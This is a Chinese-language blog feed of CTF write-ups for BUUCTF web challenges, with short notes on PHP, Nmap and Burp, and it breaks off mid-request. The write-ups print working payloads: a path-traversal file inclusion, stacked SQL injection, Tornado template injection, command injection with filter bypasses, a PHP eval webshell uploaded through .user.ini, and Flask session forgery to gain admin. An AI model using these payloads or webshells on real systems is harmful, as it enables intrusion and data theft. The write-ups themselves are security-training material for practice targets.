      <link href="/2020/04/14/BUUCTF%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2020/04/14/BUUCTF%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h4 id="下面是buuctf里的第二部分"><a href="#下面是buuctf里的第二部分" class="headerlink" title="下面是buuctf里的第二部分"></a>下面是buuctf里的第二部分</h4><a id="more"></a><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p><strong>CVE-2018-12613</strong><br>任意文件包含</p><p>payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;source.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>也可为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;source.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>因为<code>?</code>经过两次<code>URL编码</code>就是<code>%253f</code>，至于这个cve出现的具体原理。我还不是特别的清楚，下面是别人的文章，分享下链接。<br>希望下次再回来看，我已经懂了。<br><strong><a href="https://www.cnblogs.com/yichen115/p/11313084.html" target="_blank" rel="noopener">https://www.cnblogs.com/yichen115/p/11313084.html</a></strong><br><strong><a href="https://blog.51cto.com/13770310/2131305?source=dra" target="_blank" rel="noopener">https://blog.51cto.com/13770310/2131305?source=dra</a></strong></p><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>有两个方法</p><h4 id="1，"><a href="#1，" class="headerlink" title="1，"></a>1，</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：*,1</span><br><span class="line">查询语句：select *,1||flag from Flag</span><br></pre></td></tr></table></figure><h4 id="2，"><a href="#2，" class="headerlink" title="2，"></a>2，</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"></span><br><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br><span class="line"></span><br><span class="line">原理如下:</span><br><span class="line">在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。但在mysql 缺省不支持。需要调整mysql的sql_mode模式为:pipes_as_concat来实现oracle 的一些功能。</span><br></pre></td></tr></table></figure><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>贴个文章<a href="https://www.jianshu.com/p/36f0772f5ce8" target="_blank" rel="noopener">BUUCTF-Web-随便注(三种解题思路)</a></p><p>1/目前我只会第一种方法，是堆叠注入。<br>2/堆叠注入payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1';<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`words1`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">CHANGE</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>解释一下语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">` 1' `                                                                                                        :封闭前面的语句。</span><br><span class="line"><span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`words1`</span>;                                                                             :更改words的名字。</span><br><span class="line"><span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;                                                                   :更改另一个表名为words。</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">CHANGE</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;      :这里的flag是怎么发现的呢？在下面介绍</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;                                                                                      :展示column就是flag。</span><br><span class="line"><span class="comment">#                                                                                                             :将后面的语句注释掉。</span></span><br></pre></td></tr></table></figure><p><code>SQL</code> CHANGE语法:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./更改列名</span><br><span class="line">    格式：<span class="keyword">CHANGE</span> <span class="string">`old_col_name`</span> <span class="string">`new_col_name`</span> <span class="string">`column_definition`</span></span><br><span class="line">    保留<span class="keyword">old</span>和<span class="keyword">new</span>列名</span><br><span class="line">        列名：a-&gt;b 列类型</span><br><span class="line">　　    语句：<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t1 <span class="keyword">CHANGE</span> a b <span class="built_in">INTEGER</span>; <span class="comment">#注意使用时需给定列的类型，例子中给的是integer类型。具体使用时根据情况。</span></span><br></pre></td></tr></table></figure><p>ps：获得flag和id列名的方法:<code>1&#39;;show columns from</code>1919810931114514<code>;#</code><br>3/原理，因为回显的内容是从words表内回显的，所以将表名换一下顺便更改列名为id，避免失误。学到了，虽然很巧妙，但是还是没有下面的姿势看起来厉害。。。</p><h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h3><p>1/因为这个hints.txt文件里的内容是<code>md5(cookie_secret+md5(filename))</code>对filename加密后合cooie_secret再次进行md5加密。<br>2/welcome.txt里的内容是render，似乎是Vue渲染啥东西来着的，没思路了，看了一点点wp知道了是ssti。<br>3/判断原因与方法<br>根据flag.txt里的提示，访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;1da9bcca-a58b-46dc-8683-ef2a6037d08f.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;60f93b4725ab9afbec9ce6802b463ed8</span><br></pre></td></tr></table></figure><p>直接转到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;1da9bcca-a58b-46dc-8683-ef2a6037d08f.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></figure><p>而回显的是Error，所以考虑ssti服务端模板注入。<br>4/尝试：<br>将payload改为：<code>error?msg={ {0} }</code>回显<code>0</code>从而确定是ssti。<br>5/tornado特有的快速访问对象(根据wp)，<code>handler.settings</code>，这样payload就为：error?msg=<code>{ {handler.settings} }</code>，回显:<code>{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;a56f2f5e-7538-4b33-ac22-c9c91c682b38&#39;}</code>，所以<code>cookie_secret : a56f2f5e-7538-4b33-ac22-c9c91c682b38</code><br>6/根据hints加密一下，可以用python脚本，我没用脚本出错了，并且我还不知道为啥，所以建议用脚本。<br>7/<br>python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(s.encode(<span class="string">"utf8"</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filehash</span><span class="params">()</span>:</span></span><br><span class="line">    filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line">    cookie_secret = <span class="string">'a56f2f5e-7538-4b33-ac22-c9c91c682b38'</span></span><br><span class="line">    print(md5(cookie_secret + md5(filename)))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    filehash()</span><br></pre></td></tr></table></figure><p>8/运行一下脚本，获得对应的filehash<code>6df20d557a0cda86ba11332d04325d15</code><br>9/payload:<code>file?filename=/fllllllllllllag&amp;filehash=6df20d557a0cda86ba11332d04325d15</code><br>10/获得flag，这是我的第二道ssti注入题目了，感觉比第一道flask的ssti简单了点。</p><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>1/命令执行，构造payload为<code>/?ip=1;a=g;cat$IFS$1fla$a.php</code>，执行后可以在回显的页面的源码里找到flag。<br>2/知识点：<br>&lt;&lt;1&gt;&gt;a=g;fla$a.php实现的是拼接，从而过滤黑名单。<br>&lt;&lt;2&gt;&gt;$IFS$1实现绕过空格。</p><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>1/根据url里的变相提示，用php伪协议读取一下flag.php文件</p><p>2/解密一下就得flag</p><p>3/payload：<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>1/发现upload处，上传一句话，有前端检测，改一句话文件名为shell.gif，用burp改文件名为.php文件，上传不了，后端也有过滤，上传为.phtml文件，上传成功。</p><p>2/返回文件所在的目录地址，访问成功，使用蚁剑连接一句话，连接成功。</p><p>3/蚁剑当前目录打开终端，执行命令<code>cat /flag</code>,获得flag。</p><h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>1/<a href="https://www.cnblogs.com/ainv-123/p/11602952.html" target="_blank" rel="noopener">一篇前辈的文章</a></p><p>2/我试了一下admin用户，用密码’123’登录，直接就登陆成功获得flag了。感觉更像弱密码。</p><p>3/走一下标准流程。根据wp，普通用户登陆后查看change password界面源码，确实发现了提示:<code>https://github.com/woadsl1234/hctf_flask/</code></p><p>4/根据大佬的总结，因为flask的session是客户端session，提供了修改的空间<br>下面是脚本<br>链接：<a href="https://pan.baidu.com/s/1L0xk4hvyKyzubwPPsLjl_w" target="_blank" rel="noopener">https://pan.baidu.com/s/1L0xk4hvyKyzubwPPsLjl_w</a><br>提取码：q23h<br>用法：<br>解密：python 1.py encode -s “秘钥” -c “session值”<br>加密：python 1.py decode -s “秘钥” -t “明文”<br>这里的密钥为:”ckj123”.<br>5/在非admin用户的状态下登录，修改密码为123456(随意，记住改成了啥就行了)<br>用burp抓包，抓到session值带到脚本里面，获得输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;b7803726cf84d63a5659b8c468a7f50e2d54ce702a7be5c8c019f046d529c368eb0980247fba4e565dd8ba5ab20eb3fab6ff46c465ea80da7d1fd20007a44519&#39;, &#39;csrf_token&#39;: b&#39;b72ca6c06ffa1668286c01fc871a67b77ca9f24a&#39;, &#39;image&#39;: b&#39;OUgq&#39;, &#39;name&#39;: &#39;1&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure><p>b为验证码，不过跟他没关系。将name的值改为admin，也就是将1改为admin，从而达到修改admin用户的密码的效果。<br>明文:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;b7803726cf84d63a5659b8c468a7f50e2d54ce702a7be5c8c019f046d529c368eb0980247fba4e565dd8ba5ab20eb3fab6ff46c465ea80da7d1fd20007a44519&#39;, &#39;csrf_token&#39;: b&#39;b72ca6c06ffa1668286c01fc871a67b77ca9f24a&#39;, &#39;image&#39;: b&#39;OUgq&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure><p>6/将上面的明文加密得到session,将包带入。修改了admin密码且登录，直接回显了flag。</p><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>1/文件上传。<br>2/因为会对文件头进行检测，所以将文件头改为<code>GIF89a?</code>.<br>上传.user.ini文件解析图片马，文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">auto_prepend_file&#x3D;1.gif</span><br></pre></td></tr></table></figure><p>再将图片马1.gif上传，文件内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>3/用蚁剑链接payload为返回的dir下的index.php<br>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4ae636eb-b82a-4e7d-8d54-47ea41a3bebf.node3.buuoj.cn&#x2F;uploads&#x2F;48cd8b43081896fbd0931d204f947663&#x2F;index.php</span><br></pre></td></tr></table></figure><p>PS:<strong><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">-文-user.ini文件构成的PHP后门</a></strong></p><p>4/新建终端并cat /flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盲注学习笔记</title>
      <link href="/2020/04/13/%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/04/13/%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="这里是关于sql盲注的学习笔记"><a href="#这里是关于sql盲注的学习笔记" class="headerlink" title="这里是关于sql盲注的学习笔记"></a>这里是关于sql盲注的学习笔记</h3><ul><li>学习链接:*<br><a href="https://www.jianshu.com/p/65f05e7cc957" target="_blank" rel="noopener">引用自JIANSHU</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> 注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP_2020_4_7(1)</title>
      <link href="/2020/04/07/PHP-2020-4-7/"/>
      <url>/2020/04/07/PHP-2020-4-7/</url>
      
        <content type="html"><![CDATA[<h5 id="从浅显到深入，一篇二百行左右"><a href="#从浅显到深入，一篇二百行左右" class="headerlink" title="从浅显到深入，一篇二百行左右"></a>从浅显到深入，一篇二百行左右</h5><a id="more"></a><h4 id="关于php的学习-1-第一阶段的学习-lt-简单理解-gt"><a href="#关于php的学习-1-第一阶段的学习-lt-简单理解-gt" class="headerlink" title="关于php的学习(1),第一阶段的学习-&lt;简单理解&gt;"></a>关于php的学习(1),第一阶段的学习-&lt;简单理解&gt;</h4><h3 id="die-函数"><a href="#die-函数" class="headerlink" title="die();函数"></a>die();函数</h3><p><code>die()</code>函数输出一条消息，并退出当前脚本。该函数就是<code>exit()</code>函数的别名。PS:<code>该函数没有返回值</code>。</p><h3 id="error-reporting-0"><a href="#error-reporting-0" class="headerlink" title="error_reporting(0);"></a>error_reporting(0);</h3><p>禁用错误报告，意思是不返回错误信息。</p><h3 id="include-文件"><a href="#include-文件" class="headerlink" title="include 文件"></a>include 文件</h3><p><a href="https://www.w3school.com.cn/php/php_includes.asp" target="_blank" rel="noopener">w3school里关于include与require的区别与联系</a><br>我的理解:<code>include &quot;文件名&quot;;将文件的内容包含在该文件中，从而可以使用引用的文件里的各个变量。</code>,如果有输出的话就在该位置输出。学的深入后回来改。</p><h3 id="php类和对象"><a href="#php类和对象" class="headerlink" title="php类和对象"></a>php类和对象</h3><p><a href="https://www.php.net/manual/zh/oop5.intro.php" target="_blank" rel="noopener">php手册</a><br><code>$this:</code>伪变量，<code>$this-&gt;$var</code>表示的就是当前类里的一个变量名为<code>$var</code>的变量，</p><h3 id="php序列化与反序列化"><a href="#php序列化与反序列化" class="headerlink" title="php序列化与反序列化"></a>php序列化与反序列化</h3><p><a href="https://blog.csdn.net/weixin_44677409/article/details/93884388" target="_blank" rel="noopener">CSDN一篇文章</a><br>感觉写的不错，我就再偷个小懒。</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次burp错误</title>
      <link href="/2020/04/02/%E8%AE%B0%E4%B8%80%E6%AC%A1burp%E9%94%99%E8%AF%AF/"/>
      <url>/2020/04/02/%E8%AE%B0%E4%B8%80%E6%AC%A1burp%E9%94%99%E8%AF%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="记录一次400错误"><a href="#记录一次400错误" class="headerlink" title="记录一次400错误"></a>记录一次400错误</h3><a id="more"></a><p>在一次做题的时候，我的火狐代理一直不能用。一开代理就是400.就像这样。</p><p><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/02/GGODBt.png" alt="GGODBt.png"></p><p>就是<code>burp</code> -&gt;&gt; <code>proxy</code> -&gt;&gt; <code>options</code> -&gt;&gt; <code>proxy listeners</code> -&gt;&gt;里边的那个<code>勾</code>一直打不上。就像这样。</p><p><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/02/GGOR3Q.png" alt="GGOR3Q.png"></p><p>最后诸方求解才知道原来是我的计算机的80端口被我的<code>IIS</code>占用了，将我的网站所用端口改成了<code>8081</code>立马就可以用了!问题不大，但是浪费了我将近一个小时的时间，希望我的这个文章能帮到将来的你。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息泄露</title>
      <link href="/2020/03/31/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
      <url>/2020/03/31/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h4 id="记录信息泄露的各种情况"><a href="#记录信息泄露的各种情况" class="headerlink" title="记录信息泄露的各种情况"></a>记录信息泄露的各种情况</h4><a id="more"></a><h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="vim非正常关闭导致的源码泄露"><a href="#vim非正常关闭导致的源码泄露" class="headerlink" title="vim非正常关闭导致的源码泄露"></a>vim非正常关闭导致的源码泄露</h3><p>非正常关闭vim编辑器时会生成一个.swp文件在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。<br>以 index.php 为例：第一次产生的交换文件名为<code>.index.php.swp</code>再次意外退出后，将会产生名为<code>.index.php.swo</code>的交换文件第三次产生的交换文件则为<code>.index.php.swn</code>。<br><code>url</code>+<code>所对应的目录</code>就可以下载源码了.<br>恢复文件命令vim -r [文件名]</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap</title>
      <link href="/2020/03/23/Nmap/"/>
      <url>/2020/03/23/Nmap/</url>
      
        <content type="html"><![CDATA[<h4 id="一些可能会用到的参数"><a href="#一些可能会用到的参数" class="headerlink" title="一些可能会用到的参数"></a>一些可能会用到的参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">open：端口是开放的。</span><br><span class="line"></span><br><span class="line">closed：端口是关闭的。</span><br><span class="line"></span><br><span class="line">filtered：端口被防火墙IDS&#x2F;IPS屏蔽，无法确定其状态。</span><br><span class="line"></span><br><span class="line">unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。</span><br><span class="line"></span><br><span class="line">open|filtered：端口是开放的或被屏蔽。</span><br><span class="line"></span><br><span class="line">closed|filtered ：端口是关闭的或被屏蔽。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf(一)</title>
      <link href="/2020/03/23/BUUCTF%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/03/23/BUUCTF%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="从今天开始更新BUUCTF上面的题目"><a href="#从今天开始更新BUUCTF上面的题目" class="headerlink" title="从今天开始更新BUUCTF上面的题目"></a>从今天开始更新BUUCTF上面的题目</h3><h4 id="从今天开始，一天起码做一道题。"><a href="#从今天开始，一天起码做一道题。" class="headerlink" title="从今天开始，一天起码做一道题。-_-"></a>从今天开始，一天起码做一道题。-<em>_</em>-</h4><h4 id="对了，本文着重写web，其他的能省则省。"><a href="#对了，本文着重写web，其他的能省则省。" class="headerlink" title="对了，本文着重写web，其他的能省则省。"></a>对了，本文着重写web，其他的能省则省。</h4><a id="more"></a><p>-1-<br>-1-<br>-1-<br>-1-分<br>-1-割<br>-1-线<br>-1-<br>-1-<br>-1-</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="misc-二维码"><a href="#misc-二维码" class="headerlink" title="misc-二维码"></a>misc-二维码</h3><p>这个二维码扫了一下，没扫出来。<code>secret is here</code>。<br>搜了一下，是个文件合并的东西，然后就是表面似乎是个二维码，用winhex扫了一下，有个pk开头的文件hex。他们说就是zip压缩包文件了(我记住了！！！)。<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/23/8Hixun.png" alt="8Hixun.png"><br>用了那个zip压缩包解密软件，忘了叫啥名字了，效率不错很高，比那个rar解密软件的效率高多了(我觉得)(至于这个软件名，我也不记得了。。。<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/23/8HFAgJ.png" alt="8HFAgJ.png"><br>四位数字密码是压缩包里的txt文件名给的提示。<br>密码上图…<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/03/23/8HF18e.png" alt="8HF18e.png"></p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>1/最低位隐写。<br>2/查看各个颜色通道，发现图像颜色通道的上方不正常。<br>3/通过<code>Data Extract</code>将文件保存为<code>bin</code>形式，<code>save bin</code>。文件名就起做<code>1.png</code>。<br>4/是一张二维码，扫描后获得flag:<code>cumtctf{1sb_i4_s0_Ea4y}</code>。<br>5/当然，要将cumtctf改为flag后再提交</p><h3 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h3><p>1/是个二维码，直接扫描就行了。签到题…<br>2/记得Flag换成flag</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>-1-<br>-1-<br>-1-<br>-1-分<br>-1-割<br>-1-线<br>-1-<br>-1-<br>-1-</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ACTF-2020新生赛"><a href="#ACTF-2020新生赛" class="headerlink" title="[ACTF 2020新生赛]"></a>[ACTF 2020新生赛]</h2><h3 id="back-up-file"><a href="#back-up-file" class="headerlink" title="back_up_file"></a>back_up_file</h3><p>1/根据题目名访问<code>index.php.bak</code>成功，下载文件。如图<br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/05/Grul9J.png" alt="Grul9J.png"><br>这里解释一下箭头<br>&lt;第一处箭头&gt;以get方式获得变量值<br>&lt;第二处箭头&gt;intval()函数取整<br>&lt;第三处箭头&gt;很明显，要比较的字符串<br>2/payload为:<code>key=123</code><br>3/要点,弱类型比较(松散比较):(123 == 123字母···)为true。<br><br><br><br><br><br><img src= "/img/loading.gif" data-src="https://s1.ax1x.com/2020/04/05/GrKTRH.png" alt="GrKTRH.png"><br><br><br><br><br></p><h2 id="RoarCTF-2019"><a href="#RoarCTF-2019" class="headerlink" title="RoarCTF_2019"></a>RoarCTF_2019</h2><h3 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h3><p>1/php解析漏洞，传值时传的是<code>{注意空格}num=</code>，waf就找不到num，然后php解析后会自动去除前面的空格，就能成功执行后面的语句。<a href="https://blog.csdn.net/weixin_44077544/article/details/102630714" target="_blank" rel="noopener">CSDN</a><br>2/查看主目录下的文件，payload<code>http://node3.buuoj.cn:25196/calc.php?%20num=1;var_dump(chr(47))</code>，因为将<code>/</code>过滤了。发现了主目录下有文件<code>flagg</code>。<br>3/最后的payload为<code>http://node3.buuoj.cn:25196/calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code><br>翻译过来就是<code>http://node3.buuoj.cn:25196/calc.php?%20num=1;var_dump(file_get_contents(/flagg)))</code></p><p>4/<code>Tips:</code></p><p>&lt;1./&gt; var_dump为显示变量信息的函数。<br>&lt;2./&gt; file_get_contents是显示文件的具体内容的函数。</p><h2 id="WEB-2019极客大挑战"><a href="#WEB-2019极客大挑战" class="headerlink" title="WEB_2019极客大挑战"></a>WEB_2019极客大挑战</h2><h3 id="Easy-SQL"><a href="#Easy-SQL" class="headerlink" title="Easy_SQL"></a>Easy_SQL</h3><p>看到是easy sql，就先用一下万能密码，用户名是啥没有关系，密码payload为:<code>* ‘ or 1=1 #</code>，这个<code>#</code>是MySQL的单行注释符(应该是的),然后就得到了flag.<br>&ensp;&emsp;这道题开始想用sqlmap的，但是查了下wp，发现easy SQL果然是有道理的。好了，剩下来的题目明天再做。就从这道简单的题目开始吧!</p><h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>在首页里发现了<code>Secret.php</code>，将这个页面打开，发现是伪造<code>Referer</code>，和前几天做的假猪套有异曲同工之妙。没有问题的话我就只粘个payload与requests包就完了。<br>哦，Referer原来就有，是要改的。那我就发个完整的包了。<br>更改的内容(有更改的先后顺序)&lt;其实是根据提示的顺序&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">x-forwarded-for:127.0.0.1</span><br></pre></td></tr></table></figure><p>所不同的是这个改的没有假猪套多呀！<br>(完整的请求包)&lt;&lt;仅供参考学习&gt;&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Secret.php HTTP&#x2F;1.1</span><br><span class="line">Host: node3.buuoj.cn:27100</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID&#x3D;8sriagpeaoat1euei9qj7du7t0</span><br><span 